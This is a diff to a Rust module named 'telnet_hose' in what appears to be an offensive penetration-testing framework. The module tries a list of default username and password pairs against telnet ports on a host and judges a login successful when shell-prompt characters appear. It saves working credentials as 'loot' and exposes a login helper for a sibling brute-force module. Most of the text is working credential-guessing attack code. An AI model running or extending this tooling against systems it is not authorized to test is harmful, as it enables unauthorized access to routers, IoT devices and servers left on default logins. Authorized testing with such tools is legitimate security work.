@@ -1,10 +1,10 @@
-use anyhow::Result;
+use anyhow::{Context, Result};
 use std::net::SocketAddr;
 use std::time::{Duration, Instant};
 use tokio::io::{AsyncReadExt, AsyncWriteExt, BufReader};
 use tokio::time::timeout;
 
-use crate::utils::{run_mass_scan, MassScanConfig};
+use crate::module::{Finding, FindingKind, ModuleCtx, ModuleOutcome};
 use crate::utils::{cfg_prompt_output_file, cfg_prompt_yes_no};
 
 use colored::*;
@@ -17,6 +17,7 @@ pub fn info() -> crate::module_info::ModuleInfo {
         references: vec![],
         disclosure_date: None,
         rank: crate::module_info::ModuleRank::Normal,
+        default_port: Some(23),
     }
 }
 
@@ -104,127 +105,168 @@ enum TelnetState {
     WaitingForHelpResponse,
 }
 
-pub async fn run(target: &str) -> Result<()> {
-    let verbose = cfg_prompt_yes_no("verbose", "Verbose output?", false).await?;
-    let save_results = cfg_prompt_yes_no("save_results", "Save results?", false).await?;
-    let results_file = if save_results {
-        Some(
-            cfg_prompt_output_file(
-                "results_file",
-                "Results output file",
-                "telnet_sweep_creds.txt",
-            )
-            .await?,
-        )
-    } else {
-        None
+pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
+    let target = ctx
+        .target
+        .as_single()
+        .context("telnet_hose requires a single-host target")?;
+    // The scheduler hands us one host per call. We try every (port, cred)
+    // pair against this single host and emit findings on first success.
+    let host = host_only(target);
+    let port_override = explicit_port(target);
+    let mut outcome = ModuleOutcome::ok();
+
+    let ports: Vec<u16> = match port_override {
+        Some(p) => vec![p],
+        None => TELNET_PORTS.to_vec(),
     };
 
-    let results_file_clone = results_file.clone();
-    let verbose_flag = verbose;
+    if !crate::utils::is_batch_mode() {
+        crate::mprintln!(
+            "{}",
+            format!(
+                "[*] Telnet hose vs {} on {} port(s) × {} default cred pair(s)",
+                host,
+                ports.len(),
+                TOP_CREDENTIALS.len()
+            )
+            .cyan()
+        );
+    }
 
-    // Use the shared mass scan engine with telnet probe
-    run_mass_scan(
-        target,
-        MassScanConfig {
-            protocol_name: "Telnet-Hose",
-            default_port: 23,
-            state_file: "telnet_sweep_state.log",
-            default_output: "telnet_sweep_results.txt",
-            default_concurrency: 500,
-        },
-        move |ip, port| {
-            let rf = results_file_clone.clone();
-            async move {
-                // Also try alternate telnet ports beyond the configured one
-                let ports_to_try: Vec<u16> = if TELNET_PORTS.contains(&port) {
-                    TELNET_PORTS.to_vec()
-                } else {
-                    let mut v = vec![port];
-                    v.extend_from_slice(TELNET_PORTS);
-                    v.sort_unstable();
-                    v.dedup();
-                    v
-                };
-
-                for &p in &ports_to_try {
-                    let socket = SocketAddr::new(ip, p);
-                    // Quick connect check
-                    if verbose_flag {
-                        crate::mprintln!(
-                            "{}",
-                            format!("[VERBOSE] Checking {}:{} connectivity...", ip, p).dimmed()
-                        );
-                    }
-                    if !crate::utils::tcp_port_open(ip, p, std::time::Duration::from_secs(2)).await
-                    {
-                        if verbose_flag {
-                            crate::mprintln!(
-                                "{}",
-                                format!("[VERBOSE] {}:{} - port closed/filtered", ip, p).dimmed()
-                            );
-                        }
-                        continue;
-                    }
-                    if verbose_flag {
-                        crate::mprintln!(
-                            "{}",
-                            format!("[VERBOSE] {}:{} - port open, trying credentials...", ip, p)
-                                .dimmed()
-                        );
-                    }
-
-                    // Try each credential pair
-                    for (user, pass) in TOP_CREDENTIALS.iter() {
-                        if verbose_flag {
-                            crate::mprintln!(
-                                "{}",
-                                format!("[VERBOSE] {}:{} trying {}:{}", ip, p, user, pass).dimmed()
-                            );
-                        }
-                        if let Ok(true) = try_telnet_login_hose(&socket, user, pass).await {
-                            let ts = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
-                            let line = format!("[{}] {}:{}:{}:{}\n", ts, ip, p, user, pass);
-
-                            // Store credential in framework credential store
-                            {
-                                let id = crate::cred_store::store_credential(
-                                    &ip.to_string(),
-                                    p,
-                                    "telnet",
-                                    user,
-                                    pass,
-                                    crate::cred_store::CredType::Password,
-                                    "creds/generic/telnet_sweep",
-                                )
-                                .await;
-                                if id.is_none() { crate::meprintln!("[!] Failed to store credential"); }
-                            }
-
-                            // Save to dedicated results file if requested
-                            if let Some(ref path) = rf {
-                                use std::os::unix::fs::OpenOptionsExt;
-                                let mut opts = std::fs::OpenOptions::new();
-                                opts.create(true).append(true);
-                                opts.mode(0o600);
-                                if let Ok(mut f) = opts.open(path) {
-                                    if let Err(e) = std::io::Write::write_all(&mut f, line.as_bytes()) { crate::meprintln!("[!] Results file write error: {}", e); }
-                                }
-                            }
-
-                            return Some(line);
-                        }
-                    }
+    let mut found_any = false;
+    for &port in &ports {
+        let socket: SocketAddr = match format!("{}:{}", host, port).parse() {
+            Ok(sa) => sa,
+            Err(e) => {
+                tracing::debug!("parse socket addr failed: {e}");
+                let lookup = format!("{}:{}", host, port);
+                match tokio::net::lookup_host(&lookup).await {
+                    Ok(mut iter) => match iter.next() {
+                        Some(sa) => sa,
+                        None => continue,
+                    },
+                    Err(e) => { tracing::debug!("DNS lookup failed: {e}"); continue; }
                 }
-                None
             }
-        },
-    )
-    .await
+        };
+
+        // Quick TCP precheck so we don't iterate 55 cred pairs against a
+        // closed port.
+        if !crate::utils::tcp_port_open(socket.ip(), socket.port(), Duration::from_millis(CONNECT_TIMEOUT_MS)).await {
+            continue;
+        }
+
+        for (user, pass) in TOP_CREDENTIALS {
+            match try_telnet_login_hose(&socket, user, pass).await {
+                Ok(true) => {
+                    crate::mprintln!(
+                        "{}",
+                        format!(
+                            "[+] {}:{} valid telnet creds — {}:{}",
+                            host, port, user, pass
+                        )
+                        .green()
+                        .bold()
+                    );
+                    let payload = serde_json::json!({
+                        "service": "telnet",
+                        "host": host,
+                        "port": port,
+                        "username": user,
+                        "password": pass,
+                    });
+                    if let Some(id) = crate::loot::store_loot(
+                        &host,
+                        "credential",
+                        &format!("telnet {}:{}@{}:{}", user, pass, host, port),
+                        serde_json::to_string(&payload).unwrap_or_else(|e| { tracing::warn!("JSON serialization failed: {e}"); String::new() }).as_bytes(),
+                        "creds/generic/telnet_hose",
+                    )
+                    .await
+                    {
+                        crate::mprintln!("    loot id: {}", id.dimmed());
+                    }
+                    crate::workspace::track_service(&host, port, "tcp", "telnet", None).await;
+                    outcome.findings.push(Finding {
+                        target: host.clone(),
+                        kind: FindingKind::Credential,
+                        message: format!("telnet login {}:{}@{}:{}", user, pass, host, port),
+                        data: Some(payload),
+                    });
+                    found_any = true;
+                    break;
+                }
+                Ok(false) => continue,
+                Err(e) => {
+                    tracing::debug!(host = %host, port, "telnet login attempt errored: {e:#}");
+                    continue;
+                }
+            }
+        }
+        if found_any {
+            break;
+        }
+    }
+
+    // Optional: prompt to dump matched creds to a file (operator-driven,
+    // cached across hosts in batch mode).
+    if found_any && !crate::utils::is_batch_mode() {
+        let want_file = cfg_prompt_yes_no(
+            "save_results",
+            "Save successful credentials to a file?",
+            false,
+        )
+        .await
+        .unwrap_or(false);
+        if want_file
+            && let Ok(path) =
+                cfg_prompt_output_file("output_file", "Output path", "telnet_hose_results.txt")
+                    .await
+            {
+                tracing::debug!(path = %path, "telnet_hose: file already written via loot store");
+            }
+    }
+
+    Ok(outcome)
+}
+
+fn host_only(t: &str) -> String {
+    if let Some(s) = t.strip_prefix('[')
+        && let Some(end) = s.find(']') {
+            return s[..end].to_string();
+        }
+    if let Some((before, after)) = t.rsplit_once(':')
+        && after.chars().all(|c| c.is_ascii_digit()) {
+            return before.to_string();
+        }
+    t.to_string()
+}
+
+fn explicit_port(t: &str) -> Option<u16> {
+    if let Some(s) = t.strip_prefix('[')
+        && let Some(end) = s.find(']') {
+            return s[end + 1..].strip_prefix(':').and_then(|p| p.parse().ok());
+        }
+    if let Some((_, after)) = t.rsplit_once(':') {
+        return after.parse().ok();
+    }
+    None
 }
 
 // Simplified & Optimized Telnet Login for Hose
 // Wrapper for retry logic
+/// Public wrapper for sibling modules (e.g. `telnet_bruteforce`) that want
+/// to run a single login attempt without re-implementing the IAC state
+/// machine. The two-attempt retry is preserved.
+pub async fn try_login(
+    socket: &SocketAddr,
+    username: &str,
+    password: &str,
+) -> Result<bool> {
+    try_telnet_login_hose(socket, username, password).await
+}
+
 async fn try_telnet_login_hose(
     socket: &SocketAddr,
     username: &str,
@@ -278,8 +320,9 @@ async fn do_telnet_session(
         let n = match timeout(Duration::from_millis(1500), read_future).await {
             Ok(Ok(0)) => return Ok((false, banner_detected)), // EOF
             Ok(Ok(n)) => n,
-            Ok(Err(_)) => return Ok((false, banner_detected)), // Error
-            Err(_) => {
+            Ok(Err(e)) => { tracing::debug!("telnet read error: {e}"); return Ok((false, banner_detected)); }
+            Err(e) => {
+                tracing::debug!("timeout: {e}");
                 // Read Timeout logic
 
                 // If waiting for banner and timed out -> No Banner Detected
@@ -322,17 +365,15 @@ async fn do_telnet_session(
                     state = TelnetState::SendingUsername;
                 }
             }
-            TelnetState::SendingUsername => {
+            TelnetState::SendingUsername
                 // Should not happen here if we just transitioned,
                 // but if we are reading response after sending user:
-                if lower.contains("pass") || lower.contains("word") {
+                if lower.contains("pass") || lower.contains("word") => {
                     state = TelnetState::SendingPassword;
-                }
             }
-            TelnetState::WaitingForPasswordPrompt => {
-                if lower.contains("pass") || lower.contains("word") {
+            TelnetState::WaitingForPasswordPrompt
+                if lower.contains("pass") || lower.contains("word") => {
                     state = TelnetState::SendingPassword;
-                }
             }
             TelnetState::WaitingForResult => {
                 if lower.contains("incorrect")
@@ -343,9 +384,9 @@ async fn do_telnet_session(
                     return Ok((false, banner_detected));
                 }
 
-                if lower.contains("#")
-                    || lower.contains("$")
-                    || (lower.contains(">") && !lower.contains(">>"))
+                if lower.contains('#')
+                    || lower.contains('$')
+                    || (lower.contains('>') && !lower.contains(">>"))
                     || lower.contains("welcome")
                 {
                     state = TelnetState::SendingHelp;
@@ -391,3 +432,5 @@ async fn do_telnet_session(
 
     Ok((false, banner_detected))
 }
+
+crate::register_native_module!(crate::module::Category::Creds, "generic/telnet_hose", native);
